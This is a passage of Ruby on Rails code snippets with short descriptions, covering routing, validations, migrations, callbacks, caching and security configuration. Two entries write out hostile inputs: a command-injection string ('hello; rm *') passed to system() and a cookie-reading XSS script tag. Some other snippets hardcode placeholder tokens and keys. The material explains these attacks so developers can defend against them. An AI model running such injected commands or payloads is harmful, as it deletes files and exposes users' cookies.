DESCRIPTION: Demonstrates how to set up token-based authentication in a Rails controller using authenticate_or_request_with_http_token. The example securely compares the provided token against a predefined token value.

LANGUAGE: ruby
CODE:
class PostsController < ApplicationController
  TOKEN = "secret"

  before_action :authenticate

  private
    def authenticate
      authenticate_or_request_with_http_token do |token, options|
        ActiveSupport::SecurityUtils.secure_compare(token, TOKEN)
      end
    end
end

----------------------------------------

TITLE: Configuring DerivedSecretKeyProvider for Encryption
DESCRIPTION: Sets up a key provider that derives encryption keys from passwords using PBKDF2. This is a built-in key provider that forms the basis of the default Active Record encryption configuration.

LANGUAGE: ruby
CODE:
config.active_record.encryption.key_provider = ActiveRecord::Encryption::DerivedSecretKeyProvider.new(["some passwords", "to derive keys from. ", "These should be in", "credentials"])

----------------------------------------

TITLE: Adding CSRF Meta Tags to Rails Views
DESCRIPTION: ERB template code for including CSRF protection meta tags in a Rails application layout. These tags are used by JavaScript libraries to include security tokens in AJAX requests.

LANGUAGE: html
CODE:
<head>
  <%= csrf_meta_tags %>
</head>

----------------------------------------

TITLE: Finding Specific Records in Rails
DESCRIPTION: Demonstrates how to find specific records using find_by and find methods. find_by returns the first matching record or nil, while find expects to find a record with the given ID and raises an exception if not found.

LANGUAGE: ruby
CODE:
# Returns the first book with a given title or `nil` if no book is found.
book = Book.find_by(title: "Metaprogramming Ruby 2")

# Alternative to Book.find_by(id: 42). Will throw an exception if no matching book is found.
book = Book.find(42)

----------------------------------------

TITLE: Validating Associated Objects in Rails
DESCRIPTION: This snippet demonstrates how to ensure that all associated objects are valid before saving the parent object. The validates_associated method triggers validation on each associated object when the parent is validated.

LANGUAGE: ruby
CODE:
class Library < ApplicationRecord
  has_many :books
  validates_associated :books
end

----------------------------------------

TITLE: Implementing Date Comparison Validation
DESCRIPTION: Example of using the comparison validator to ensure an end date is after a start date. This demonstrates validating relationships between two model attributes.

LANGUAGE: ruby
CODE:
class Promotion < ApplicationRecord
  validates :end_date, comparison: { greater_than: :start_date }
end

----------------------------------------

TITLE: Testing Article Creation in Rails Integration Test
DESCRIPTION: An integration test that verifies the workflow of creating a new article. It accesses the new article form, submits a POST request with article data, follows the redirect, and verifies the article was created.

LANGUAGE: ruby
CODE:
test "can create an article" do
  get "/articles/new"
  assert_response :success

  post "/articles",
    params: { article: { title: "can create", body: "article successfully." } }
  assert_response :redirect
  follow_redirect!
  assert_response :success
  assert_dom "p", "Title:\n  can create"
end

----------------------------------------

TITLE: Configuring CSP Nonce Generation with SecureRandom
DESCRIPTION: This configuration sets up Content Security Policy with nonce generation using SecureRandom, which creates a unique nonce for each request to allow specific inline scripts while maintaining strong CSP protection.

LANGUAGE: ruby
CODE:
# config/initializers/content_security_policy.rb
Rails.application.config.content_security_policy do |policy|
  policy.script_src :self, :https
end

Rails.application.config.content_security_policy_nonce_generator = -> request { SecureRandom.base64(16) }

----------------------------------------

TITLE: Implementing Data Migrations in Ruby on Rails
DESCRIPTION: A migration example that adds initial product data to the database, with methods for both creating (up) and removing (down) the data. This demonstrates how migrations can be used for data manipulation as well as schema changes.

LANGUAGE: ruby
CODE:
class AddInitialProducts < ActiveRecord::Migration[8.1]
  def up
    5.times do |i|
      Product.create(name: "Product ##{i}", description: "A product.")
    end
  end

  def down
    Product.delete_all
  end
end

----------------------------------------

TITLE: Creating and registering email interceptors in Rails
DESCRIPTION: Shows how to create an email interceptor class that can modify emails before delivery, and how to register it in a Rails initializer. The example redirects all emails to a sandbox address in staging environments.

LANGUAGE: ruby
CODE:
class SandboxEmailInterceptor
  def self.delivering_email(message)
    message.to = ["sandbox@example.com"]
  end
end

LANGUAGE: ruby
CODE:
Rails.application.configure do
  if Rails.env.staging?
    config.action_mailer.interceptors = %w[SandboxEmailInterceptor]
  end
end

----------------------------------------

TITLE: Implementing Shallow Nesting with Explicit Routes in Rails
DESCRIPTION: Demonstrates how to implement shallow nesting by manually specifying which actions should be nested under the parent resource using the :only option. Collection actions remain nested while member actions are defined at the top level.

LANGUAGE: ruby
CODE:
resources :articles do
  resources :comments, only: [:index, :new, :create]
end
resources :comments, only: [:show, :edit, :update, :destroy]

----------------------------------------

TITLE: Handling Query Parameters in Controller Actions
DESCRIPTION: Example demonstrating how to access and use query string parameters in a controller action to filter data based on parameter values.

LANGUAGE: ruby
CODE:
class ClientsController < ApplicationController
  # This action receives query string parameters from an HTTP GET request
  # at the URL "/clients?status=activated"
  def index
    if params[:status] == "activated"
      @clients = Client.activated
    else
      @clients = Client.inactivated
    end
  end

  # This action receives parameters from a POST request to "/clients" URL with  form data in the request body.
  def create
    @client = Client.new(params[:client])
    if @client.save
      redirect_to @client
    else
      render "new"
    end
  end
end

----------------------------------------

TITLE: Implementing Create Callbacks in Ruby on Rails
DESCRIPTION: Demonstrates create callbacks that are triggered when a new record is saved to the database for the first time. This example shows before_create, around_create, and after_create callbacks for setting default roles, logging creation, and sending welcome emails.

LANGUAGE: ruby
CODE:
class User < ApplicationRecord
  before_create :set_default_role
  around_create :log_creation
  after_create :send_welcome_email

  private
    def set_default_role
      self.role = "user"
      Rails.logger.info("User role set to default: user")
    end

    def log_creation
      Rails.logger.info("Creating user with email: #{email}")
      yield
      Rails.logger.info("User created with email: #{email}")
    end

    def send_welcome_email
      UserMailer.welcome_email(self).deliver_later
      Rails.logger.info("User welcome email sent to: #{email}")
    end
end

LANGUAGE: irb
CODE:
irb> user = User.create(name: "John Doe", email: "john.doe@example.com")

User role set to default: user
Creating user with email: john.doe@example.com
User created with email: john.doe@example.com
User welcome email sent to: john.doe@example.com
=> #<User id: 10, email: "john.doe@example.com", created_at: "2024-03-20 16:19:52.405195000 +0000", updated_at: "2024-03-20 16:19:52.405195000 +0000", name: "John Doe">

----------------------------------------

TITLE: Secure Query Using Rails' Method Chaining
DESCRIPTION: Shows how to build secure queries by using Rails' chainable query methods that automatically handle sanitization of user input.

LANGUAGE: ruby
CODE:
Model.where(zip_code: entered_zip_code).where("quantity >= ?", entered_quantity).first

----------------------------------------

TITLE: Creating a Table without Primary Key
DESCRIPTION: Migration that creates a users table without any primary key by passing id: false option to create_table.

LANGUAGE: ruby
CODE:
class CreateUsers < ActiveRecord::Migration[8.1]
  def change
    create_table :users, id: false do |t|
      t.string :username
      t.string :email
      t.timestamps
    end
  end
end

----------------------------------------

TITLE: Customizing Primary Key Column in Rails Models
DESCRIPTION: Demonstrates how to specify a different column as the primary key using the primary_key= method, allowing models to work with tables that don't use 'id' as their primary key.

LANGUAGE: ruby
CODE:
class Book < ApplicationRecord
  self.primary_key = "book_id"
end

----------------------------------------

TITLE: Implementing Validations with ActiveModel in Ruby
DESCRIPTION: This snippet shows how to add validation capabilities to a Ruby class using ActiveModel::Validations. It demonstrates various validation types including presence validation, format validation, and strict validation.

LANGUAGE: ruby
CODE:
class Person
  include ActiveModel::Validations

  attr_accessor :name, :email, :token

  validates :name, presence: true
  validates :email, format: { with: URI::MailTo::EMAIL_REGEXP }
  validates! :token, presence: true
end

----------------------------------------

TITLE: Using :on Option for Validation Context in Rails
DESCRIPTION: Demonstrates how to use the `:on` option to specify when validations should run - either during creation, update, or in custom contexts. This example shows validations that run only on create, only on update, and validations that run in both contexts.

LANGUAGE: ruby
CODE:
class Person < ApplicationRecord
  # it will be possible to update email with a duplicated value
  validates :email, uniqueness: true, on: :create

  # it will be possible to create the record with a non-numerical age
  validates :age, numericality: true, on: :update

  # the default (validates on both create and update)
  validates :name, presence: true
end

----------------------------------------

TITLE: Implementing User Appearance Channel in Ruby
DESCRIPTION: Creates a channel for tracking user online status and current page. This implementation handles user appearances, disappearances, and away status through channel callbacks and actions.

LANGUAGE: ruby
CODE:
# app/channels/appearance_channel.rb
class AppearanceChannel < ApplicationCable::Channel
  def subscribed
    current_user.appear
  end

  def unsubscribed
    current_user.disappear
  end

  def appear(data)
    current_user.appear(on: data["appearing_on"])
  end

  def away
    current_user.away
  end
end

----------------------------------------

TITLE: Command Line Injection Vulnerability in Ruby system() Method
DESCRIPTION: Example showing how user input concatenated directly into a system command can lead to command injection via shell command chaining with semicolons.

LANGUAGE: ruby
CODE:
user_input = "hello; rm *"
system("/bin/echo #{user_input}")
# prints "hello", and deletes files in the current directory

----------------------------------------

TITLE: Defining a Basic Route in Rails
DESCRIPTION: Shows how to define a simple route that maps a GET request with an ID parameter to the show action of the users controller.

LANGUAGE: ruby
CODE:
get "/users/:id", to: "users#show"

----------------------------------------

TITLE: Validating Format with Regular Expressions in Rails
DESCRIPTION: Demonstrates how to validate an attribute against a regular expression pattern using the format validator. This example ensures that a legacy_code field only contains letters.

LANGUAGE: ruby
CODE:
class Product < ApplicationRecord
  validates :legacy_code, format: { with: /\A[a-zA-Z]+\z/,
    message: "only allows letters" }
end

----------------------------------------

TITLE: Using local_assigns with Partials in Rails
DESCRIPTION: Shows how to use local_assigns to conditionally pass variables to partials. This approach allows the same partial to be used with different parameters in different views.

LANGUAGE: erb
CODE:
<%= render user.articles %>

LANGUAGE: erb
CODE:
<%= render article, full: true %>

LANGUAGE: erb
CODE:
<h2><%= article.title %></h2>

<% if local_assigns[:full] %>
  <%= simple_format article.body %>
<% else %>
  <%= truncate article.body %>
<% end %>

----------------------------------------

TITLE: Implementing Association Callbacks with Book Limit Validation
DESCRIPTION: Defines a before_add association callback to prevent adding more than 5 books to an author. The callback throws :abort to prevent the addition when the limit is reached.

LANGUAGE: ruby
CODE:
class Author < ApplicationRecord
  has_many :books, before_add: :check_limit

  private
    def check_limit(_book)
      if books.count >= 5
        errors.add(:base, "Cannot add more than 5 books for this author")
        throw(:abort)
      end
    end
end

----------------------------------------

TITLE: Changing Signed Cookie Digest Algorithm in Rails
DESCRIPTION: Code showing how to change the digest algorithm used for signed cookies from SHA1 to SHA256. This improves the security of signed cookies by using a stronger hashing algorithm.

LANGUAGE: ruby
CODE:
Rails.application.config.action_dispatch.signed_cookie_digest = "SHA256"

----------------------------------------

TITLE: Implementing Application Layout in Rails with HTML+ERB
DESCRIPTION: A basic application layout template example that provides the HTML structure for a Rails application. It includes navigation, content yield area, and footer sections.

LANGUAGE: html+erb
CODE:
<!DOCTYPE html>
<html>
<head>
  <title><%= "Your Rails App" %></title>
  <%= csrf_meta_tags %>
  <%= csp_meta_tag %>
  <%= stylesheet_link_tag "application", "data-turbo-track": "reload" %>
  <%= javascript_importmap_tags %>
</head>
<body>

<nav>
  <ul>
    <li><%= link_to "Home", root_path %></li>
    <li><%= link_to "Products", products_path %></li>
    <!-- Additional navigation links here -->
  </ul>
</nav>

<%= yield %>

<footer>
  <p>&copy; <%= Date.current.year %> Your Company</p>
</footer>

----------------------------------------

TITLE: Configuring ActionMailer for Gmail SMTP delivery
DESCRIPTION: Configuration setup for using Gmail's SMTP server to send emails in Rails. Includes settings for address, port, authentication, and timeout options, with credentials stored securely using Rails credentials system.

LANGUAGE: ruby
CODE:
config.action_mailer.delivery_method = :smtp
config.action_mailer.smtp_settings = {
  address:         "smtp.gmail.com",
  port:            587,
  domain:          "example.com",
  user_name:       Rails.application.credentials.dig(:smtp, :user_name),
  password:        Rails.application.credentials.dig(:smtp, :password),
  authentication:  "plain",
  enable_starttls: true,
  open_timeout:    5,
  read_timeout:    5 }

----------------------------------------

TITLE: Inserting Middleware at the Top of Rails Stack
DESCRIPTION: Shows how to add middleware at the very beginning of the Rails middleware stack using a numeric index. This ensures the middleware processes the request first.

LANGUAGE: ruby
CODE:
config.middleware.insert_before 0, Magical::Unicorns

----------------------------------------

TITLE: Adding Rich Text Form Field in Rails
DESCRIPTION: Demonstrates how to implement a rich text form field using form.rich_text_area in a Rails form. This enables users to input formatted text with the Action Text editor.

LANGUAGE: erb
CODE:
<div>
  <%= form.label :description, style: "display: block" %>
  <%= form.rich_text_area :description %>
</div>

----------------------------------------

TITLE: Wrapping Application Code in a Thread with Rails Executor
DESCRIPTION: Shows how to properly use the Rails Executor when creating a new thread that runs application code. This ensures thread-safety with autoloading and connection management in manually-created threads.

LANGUAGE: ruby
CODE:
Thread.new do
  Rails.application.executor.wrap do
    # your code here
  end
end

----------------------------------------

TITLE: Configuring Advanced RedisCacheStore in Rails
DESCRIPTION: Sets up a production-ready Redis cache store with multiple servers, custom timeouts, reconnection attempts, and error handling. This complex configuration provides better control over Redis caching behavior.

LANGUAGE: ruby
CODE:
cache_servers = %w(redis://cache-01:6379/0 redis://cache-02:6379/0)
config.cache_store = :redis_cache_store, { url: cache_servers,

  connect_timeout:    30,  # Defaults to 1 second
  read_timeout:       0.2, # Defaults to 1 second
  write_timeout:      0.2, # Defaults to 1 second
  reconnect_attempts: 2,   # Defaults to 1

  error_handler: -> (method:, returning:, exception:) {
    # Report errors to Sentry as warnings
    Sentry.capture_exception exception, level: "warning",
      tags: { method: method, returning: returning }
  }
}

----------------------------------------

TITLE: Implementing Nested Resources in Rails Routing
DESCRIPTION: Creates nested routes that capture the parent-child relationship between magazines and ads. This generates routes that require a magazine_id parameter for accessing the ads resources.

LANGUAGE: ruby
CODE:
resources :magazines do
  resources :ads
end

----------------------------------------

TITLE: Complex Migration with SQL queries using reversible in Ruby on Rails
DESCRIPTION: Demonstrates a more complex migration using reversible for operations that don't have direct ActiveRecord equivalents, such as creating and dropping a database view using raw SQL queries.

LANGUAGE: ruby
CODE:
class ExampleMigration < ActiveRecord::Migration[8.1]
  def change
    create_table :distributors do |t|
      t.string :zipcode
    end

    reversible do |direction|
      direction.up do
        # create a distributors view
        execute <<-SQL
          CREATE VIEW distributors_view AS
          SELECT id, zipcode
          FROM distributors;
        SQL
      end
      direction.down do
        execute <<-SQL
          DROP VIEW distributors_view;
        SQL
      end
    end

    add_column :users, :address, :string
  end
end

----------------------------------------

TITLE: Creating Tables with Composite Primary Keys in Rails Migrations
DESCRIPTION: Shows how to create a table with a composite primary key using the primary_key option with an array value. This defines a products table where the primary key consists of customer_id and product_sku together.

LANGUAGE: ruby
CODE:
class CreateProducts < ActiveRecord::Migration[8.1]
  def change
    create_table :products, primary_key: [:customer_id, :product_sku] do |t|
      t.integer :customer_id
      t.string :product_sku
      t.text :description
    end
  end
end

----------------------------------------

TITLE: Using Environment Variables in Production Database Configuration
DESCRIPTION: Best practice for production environments to use environment variables for database connection details using ERB in the database.yml file. This approach prevents storing database credentials in source control.

LANGUAGE: yaml
CODE:
production:
  url: <%= ENV['DATABASE_URL'] %>

----------------------------------------

TITLE: Overriding Default HTTP Security Headers in Rails
DESCRIPTION: This example shows how to override or add HTTP security headers in the Rails application configuration. In this case, it changes X-Frame-Options to DENY and adds a custom header.

LANGUAGE: ruby
CODE:
config.action_dispatch.default_headers["X-Frame-Options"] = "DENY"
config.action_dispatch.default_headers["Header-Name"]     = "Value"

----------------------------------------

TITLE: Generated Create Table Migration in Ruby on Rails
DESCRIPTION: This migration, generated from the CreateProducts command, sets up a products table with name and part_number columns plus timestamp columns.

LANGUAGE: ruby
CODE:
class CreateProducts < ActiveRecord::Migration[8.1]
  def change
    create_table :products do |t|
      t.string :name
      t.string :part_number

      t.timestamps
    end
  end
end

----------------------------------------

TITLE: Configuring Model Relationships with Touch for Cache Invalidation
DESCRIPTION: This code shows how to set up touch: true on a belongs_to association to ensure that when a child record is updated, the parent's updated_at timestamp is also updated, helping to properly invalidate nested caches.

LANGUAGE: ruby
CODE:
class Product < ApplicationRecord
  has_many :games
end

class Game < ApplicationRecord
  belongs_to :product, touch: true
end

----------------------------------------

TITLE: Creating a Book for an Author Using Associations in Ruby on Rails
DESCRIPTION: Code example showing how to create a book for an author using associations. The association provides a cleaner, more intuitive way to create related records.

LANGUAGE: ruby
CODE:
@book = @author.books.create(published_at: Time.now)

----------------------------------------

TITLE: Declaring Enums in ActiveRecord Ruby Models
DESCRIPTION: Shows how to define enums in ActiveRecord models which automatically creates scopes and helper methods for each enum value. The example creates status enum for an Order model with various states.

LANGUAGE: ruby
CODE:
class Order < ApplicationRecord
  enum :status, [:shipped, :being_packaged, :complete, :cancelled]
end

LANGUAGE: ruby
CODE:
irb> Order.shipped
=> #<ActiveRecord::Relation> # all orders with status == :shipped
irb> Order.not_shipped
=> #<ActiveRecord::Relation> # all orders with status != :shipped

LANGUAGE: ruby
CODE:
irb> order = Order.shipped.first
irb> order.shipped?
=> true
irb> order.complete?
=> false

LANGUAGE: ruby
CODE:
irb> order = Order.first
irb> order.shipped!
UPDATE "orders" SET "status" = ?, "updated_at" = ? WHERE "orders"."id" = ?  [["status", 0], ["updated_at", "2019-01-24 07:13:08.524320"], ["id", 1]]
=> true

----------------------------------------

TITLE: Configuring SameSite Cookie Protection with Dynamic Request-Based Logic
DESCRIPTION: Example of using a lambda to dynamically set the SameSite attribute for cookies based on the request's user agent. This allows for conditional cookie security settings.

LANGUAGE: ruby
CODE:
config.action_dispatch.cookies_same_site_protection = ->(request) do
  :strict unless request.user_agent == "TestAgent"
end

----------------------------------------

TITLE: Creating a Reusable Callback Class with Class Methods
DESCRIPTION: Example of a callback class using class methods instead of instance methods. This approach is often more appropriate when the callback doesn't need to maintain state across calls.

LANGUAGE: ruby
CODE:
class FileDestroyerCallback
  def self.after_commit(file)
    if File.exist?(file.filepath)
      File.delete(file.filepath)
    end
  end
end

----------------------------------------

TITLE: Permitting Parameters for Nested Attributes in Rails
DESCRIPTION: This snippet shows how to permit parameters for nested attributes, including the special :id and :_destroy parameters that are used when working with accepts_nested_attributes_for in Rails models.

LANGUAGE: ruby
CODE:
# permit :id and :_destroy
params.expect(author: [ :name, books_attributes: [[ :title, :id, :_destroy ]] ])

----------------------------------------

TITLE: Creating Records with Active Record in Rails
DESCRIPTION: Shows how to create and save records using the create method, which instantiates an object and saves it to the database in one step. This example creates a book record with title and author attributes.

LANGUAGE: ruby
CODE:
book = Book.create(title: "The Lord of the Rings", author: "J.R.R. Tolkien")

# Note that the `id` is assigned as this record is committed to the database.
book.inspect
# => "#<Book id: 106, title: \"The Lord of the Rings\", author: \"J.R.R. Tolkien\", created_at: \"2024-03-04 19:15:58.033967000 +0000\", updated_at: \"2024-03-04 19:15:58.033967000 +0000\">"

----------------------------------------

TITLE: Installing WSL and Ruby on Windows
DESCRIPTION: This snippet shows how to install Windows Subsystem for Linux (WSL) with Ubuntu, which provides an optimal environment for Ruby on Rails development on Windows systems.

LANGUAGE: bash
CODE:
$ wsl --install --distribution Ubuntu-24.04

----------------------------------------

TITLE: Best Practice: Caching IDs Instead of Active Record Objects
DESCRIPTION: This code shows the recommended approach of caching IDs or primitive values instead of Active Record objects. This avoids stale data issues by fetching fresh records from the database using the cached IDs.

LANGUAGE: ruby
CODE:
# super_admins is an expensive SQL query, so don't run it too often
ids = Rails.cache.fetch("super_admin_user_ids", expires_in: 12.hours) do
  User.super_admins.pluck(:id)
end
User.where(id: ids).to_a

----------------------------------------

TITLE: Using ActiveModel Objects with form_with in ERB Templates
DESCRIPTION: This snippet shows how to use an ActiveModel::API object with the form_with helper in an ERB template. It demonstrates how Active Model objects can be used with Action View helpers just like Active Record objects.

LANGUAGE: html+erb
CODE:
<%= form_with model: EmailContact.new do |form| %>
  <%= form.text_field :name %>
<% end %>

----------------------------------------

TITLE: Defining Book model with Active Record associations and scopes in Ruby
DESCRIPTION: Defines a Book class with multiple associations and custom scopes for filtering books based on print status, age, and price criteria.

LANGUAGE: ruby
CODE:
class Book < ApplicationRecord
  belongs_to :supplier
  belongs_to :author
  has_many :reviews
  has_and_belongs_to_many :orders, join_table: "books_orders"

  scope :in_print, -> { where(out_of_print: false) }
  scope :out_of_print, -> { where(out_of_print: true) }
  scope :old, -> { where(year_published: ...50.years.ago.year) }
  scope :out_of_print_and_expensive, -> { out_of_print.where("price > 500") }
  scope :costs_more_than, ->(amount) { where("price > ?", amount) }
end

----------------------------------------

TITLE: Optimizing Confirmation Validation with Conditional Logic
DESCRIPTION: Example showing how to optimize confirmation validation by only validating the confirmation field when the original field has changed, not on every save.

LANGUAGE: ruby
CODE:
class Person < ApplicationRecord
  validates :email, confirmation: true
  validates :email_confirmation, presence: true, if: :email_changed?
end

----------------------------------------

TITLE: Combining Multiple Validation Conditions in Rails
DESCRIPTION: Shows how to combine multiple conditions using arrays and both :if and :unless options for complex validation logic. The validation runs only when all :if conditions and none of the :unless conditions are true.

LANGUAGE: ruby
CODE:
class Computer < ApplicationRecord
  validates :mouse, presence: true,
                    if: [Proc.new { |c| c.market.retail? }, :desktop?],
                    unless: Proc.new { |c| c.trackpad.present? }
end

----------------------------------------

TITLE: Allow Nil Validation Option in Rails
DESCRIPTION: This snippet demonstrates the allow_nil option which skips validation when the value is nil. The Coffee model validates size inclusion in a set of values, but allows nil values to pass validation.

LANGUAGE: ruby
CODE:
class Coffee < ApplicationRecord
  validates :size, inclusion: { in: %w(small medium large),
    message: "%{value} is not a valid size" }, allow_nil: true
end

----------------------------------------

TITLE: Enqueuing a Basic Job in Ruby on Rails
DESCRIPTION: Demonstrates how to enqueue a job to be performed as soon as the queuing system is available using the perform_later method.

LANGUAGE: ruby
CODE:
# Enqueue a job to be performed as soon as the queuing system is
# free.
GuestsCleanupJob.perform_later guest

----------------------------------------

TITLE: Implementing Fragment Caching in Rails ERB Templates
DESCRIPTION: This snippet demonstrates how to implement fragment caching for a collection of products in a Rails view. The cache block wraps the product rendering to store and serve cached content for each product individually.

LANGUAGE: html+erb
CODE:
<% @products.each do |product| %>
  <% cache product do %>
    <%= render product %>
  <% end %>
<% end %>

----------------------------------------

TITLE: Cookie Display Using JavaScript Injection
DESCRIPTION: A simple XSS payload that writes the document's cookie to the page. This demonstrates how an attacker can access cookies when JavaScript injection is possible but isn't directly useful to attackers since it only displays the cookie to the victim.

LANGUAGE: html
CODE:
<script>document.write(document.cookie);</script>

----------------------------------------

TITLE: Bulk Inserting Records in Rails
DESCRIPTION: Demonstrates how to insert records directly into the database using insert and insert_all methods, which bypass Active Record callbacks and validations for better performance.

LANGUAGE: ruby
CODE:
Book.insert(title: "The Lord of the Rings", author: "J.R.R. Tolkien")
Book.insert_all([{ title: "The Lord of the Rings", author: "J.R.R. Tolkien" }])

----------------------------------------

TITLE: Creating a Custom EachValidator in Rails
DESCRIPTION: Shows how to create a custom validator for individual attributes by inheriting from ActiveModel::EachValidator and implementing validate_each. This is useful for validations that apply to specific attributes.

LANGUAGE: ruby
CODE:
class EmailValidator < ActiveModel::EachValidator
  def validate_each(record, attribute, value)
    unless URI::MailTo::EMAIL_REGEXP.match?(value)
      record.errors.add attribute, (options[:message] || "is not an email")
    end
  end
end

class Person < ApplicationRecord
  validates :email, presence: true, email: true
end

----------------------------------------

TITLE: Passing Local Variables to Partials in Rails Views
DESCRIPTION: Demonstrates how to pass local variables to partials in Rails. This example shows how to share a form partial between new and edit views with localized content.

LANGUAGE: html+erb
CODE:
<h1>New zone</h1>
<%= render partial: "form", locals: {zone: @zone} %>

LANGUAGE: html+erb
CODE:
<h1>Editing zone</h1>
<%= render partial: "form", locals: {zone: @zone} %>

LANGUAGE: html+erb
CODE:
<%= form_with model: zone do |form| %>
  <p>
    <b>Zone name</b><br>
    <%= form.text_field :name %>
  </p>
  <p>
    <%= form.submit %>
  </p>
<% end %>

----------------------------------------

TITLE: Setting Attribute-specific Encryption Keys in Active Record
DESCRIPTION: Configures a specific encryption key for an individual attribute using the :key option. The key will be used to derive the actual encryption key.

LANGUAGE: ruby
CODE:
class Article < ApplicationRecord
  encrypts :summary, key: "some secret key for article summaries"
end

----------------------------------------

TITLE: Implementing Exception Handling in a Rails Job
DESCRIPTION: Demonstrates how to use rescue_from to handle exceptions raised during job execution. This example catches ActiveRecord::RecordNotFound exceptions in a GuestsCleanupJob.

LANGUAGE: ruby
CODE:
class GuestsCleanupJob < ApplicationJob
  queue_as :default

  rescue_from(ActiveRecord::RecordNotFound) do |exception|
    # Do something with the exception
  end

  def perform
    # Do something later
  end
end

----------------------------------------

TITLE: Generating Migration with Field Modifiers
DESCRIPTION: Rails generator command that creates a migration with field modifiers. This example adds a decimal column with precision and scale, and a polymorphic reference to a supplier.

LANGUAGE: bash
CODE:
$ bin/rails generate migration AddDetailsToProducts 'price:decimal{5,2}' supplier:references{polymorphic}

----------------------------------------

TITLE: Deleting Records with destroy_all in Rails
DESCRIPTION: Demonstrates how to delete all records from the Book model using the destroy_all method. This method loads each record into memory and runs callbacks before deletion.

LANGUAGE: ruby
CODE:
Book.destroy_all

----------------------------------------

TITLE: Using Custom Validation Contexts with save
DESCRIPTION: This code demonstrates how to trigger validations for specific contexts during the save operation using the context option. This allows for contextual saving based on specific validation criteria.

LANGUAGE: ruby
CODE:
irb> user = User.new(name: "John Doe", age: 17, email: "jane@example.com", phone: "1234567890", address: "123 Main St")
irb> user.save(context: :personal_info) # => false
irb> user.save(context: :contact_info) # => true
irb> user.save(context: :location_info) # => false

----------------------------------------

TITLE: Using preload for Eager Loading Associations Separately
DESCRIPTION: Demonstrates using the preload method to eager load associations with separate queries. Similar to includes, this loads books and their authors in just 2 queries, but always uses separate queries rather than potentially using joins.

LANGUAGE: ruby
CODE:
books = Book.preload(:author).limit(10)

books.each do |book|
  puts book.author.last_name
end

LANGUAGE: sql
CODE:
SELECT books.* FROM books LIMIT 10
SELECT authors.* FROM authors
  WHERE authors.id IN (1,2,3,4,5,6,7,8,9,10)

----------------------------------------

TITLE: Implementing after_destroy Callback in Rails Model
DESCRIPTION: Basic implementation of an after_destroy callback that deletes a file from disk when a PictureFile record is destroyed. This approach has limitations because file deletion occurs before transaction completion.

LANGUAGE: ruby
CODE:
class PictureFile < ApplicationRecord
  after_destroy :delete_picture_file_from_disk

  def delete_picture_file_from_disk
    if File.exist?(filepath)
      File.delete(filepath)
    end
  end
end

----------------------------------------

TITLE: Running Rails Authentication Generator
DESCRIPTION: Command to generate authentication components in a Rails application. This creates models, controllers, views, and migrations needed for basic authentication and password reset functionality.

LANGUAGE: bash
CODE:
$ rails generate authentication
      invoke  erb
      create    app/views/passwords/new.html.erb
      create    app/views/passwords/edit.html.erb
      create    app/views/sessions/new.html.erb
      create  app/models/session.rb
      create  app/models/user.rb
      create  app/models/current.rb
      create  app/controllers/sessions_controller.rb
      create  app/controllers/concerns/authentication.rb
      create  app/controllers/passwords_controller.rb
      create  app/mailers/passwords_mailer.rb
      create  app/views/passwords_mailer/reset.html.erb
      create  app/views/passwords_mailer/reset.text.erb
      create  test/mailers/previews/passwords_mailer_preview.rb
        gsub  app/controllers/application_controller.rb
       route  resources :passwords, param: :token
       route  resource :session
        gsub  Gemfile
      bundle  install --quiet
    generate  migration CreateUsers email_address:string!:uniq password_digest:string! --force
       rails  generate migration CreateUsers email_address:string!:uniq password_digest:string! --force
      invoke  active_record
      create    db/migrate/20241010215312_create_users.rb
    generate  migration CreateSessions user:references ip_address:string user_agent:string --force
       rails  generate migration CreateSessions user:references ip_address:string user_agent:string --force
      invoke  active_record
      create    db/migrate/20241010215314_create_sessions.rb

----------------------------------------

TITLE: Implementing Basic Presence Validation in Active Record Models
DESCRIPTION: A simple example of validating the presence of a name attribute in a Person model. This ensures that a Person record cannot be saved without a name.

LANGUAGE: ruby
CODE:
class Person < ApplicationRecord
  validates :name, presence: true
end

----------------------------------------

TITLE: Implementing Model Callbacks in Rails
DESCRIPTION: Example of defining and using an after_create callback in a User model. This demonstrates how to execute custom code automatically after a new record is created.

LANGUAGE: ruby
CODE:
class User < ApplicationRecord
  after_create :log_new_user

  private
    def log_new_user
      puts "A new user was registered"
    end
end

----------------------------------------

TITLE: Creating Basic Form with form_with in Rails ERB
DESCRIPTION: Demonstrates the basic usage of form_with helper without arguments, which creates a form that posts to the current page. The generated HTML includes Rails' authenticity token for CSRF protection.

LANGUAGE: erb
CODE:
<%= form_with do |form| %>
  Form contents
<% end %>

LANGUAGE: html
CODE:
<form action="/home" accept-charset="UTF-8" method="post">
  <input type="hidden" name="authenticity_token" value="Lz6ILqUEs2CGdDa-oz38TqcqQORavGnbGkG0CQA8zc8peOps-K7sHgFSTPSkBx89pQxh3p5zPIkjoOTiA_UWbQ" autocomplete="off">
  Form contents
</form>

----------------------------------------

TITLE: Generating Migration with NOT NULL Constraint
DESCRIPTION: Rails generator command that creates a migration to add a NOT NULL column to the users table using the ! shortcut in the column definition.

LANGUAGE: bash
CODE:
$ bin/rails generate migration AddEmailToUsers email:string!

----------------------------------------

TITLE: Custom Validation Contexts with :on Option in Rails
DESCRIPTION: Shows how to define and use custom validation contexts that can be triggered explicitly. Custom contexts are defined in the model and then must be explicitly triggered when validating or saving objects.

LANGUAGE: ruby
CODE:
class Person < ApplicationRecord
  validates :email, uniqueness: true, on: :account_setup
  validates :age, numericality: true, on: :account_setup
end

----------------------------------------

TITLE: Using :as Option in Nested Resources to Override Helper Names
DESCRIPTION: Shows how to customize routing helper names for resources in nested routes using the :as option. This allows more descriptive or contextual naming for nested resource routes.

LANGUAGE: ruby
CODE:
resources :magazines do
  resources :ads, as: "periodical_ads"
end

----------------------------------------

TITLE: Testing Action Cable Connection with Cookies in Rails
DESCRIPTION: A test example for Action Cable connections using cookies for authentication. It demonstrates setting a signed cookie and then verifying that the connection is established with the correct user ID.

LANGUAGE: ruby
CODE:
test "connects with cookies" do
  cookies.signed[:user_id] = "42"

  connect

  assert_equal connection.user_id, "42"
end

----------------------------------------

TITLE: Case-Insensitive Uniqueness Validation in Rails
DESCRIPTION: This snippet demonstrates how to configure case sensitivity for uniqueness validations. Setting case_sensitive to false ensures that records with the same name in different cases are considered duplicates.

LANGUAGE: ruby
CODE:
class Person < ApplicationRecord
  validates :name, uniqueness: { case_sensitive: false }
end

----------------------------------------

TITLE: Using up and down methods for Migration in Ruby on Rails
DESCRIPTION: An alternative approach to the reversible method, using separate up and down methods to define migration and rollback behavior. This example changes a price column from integer to string type and back.

LANGUAGE: ruby
CODE:
class ChangeProductsPrice < ActiveRecord::Migration[8.1]
  def up
    change_table :products do |t|
      t.change :price, :string
    end
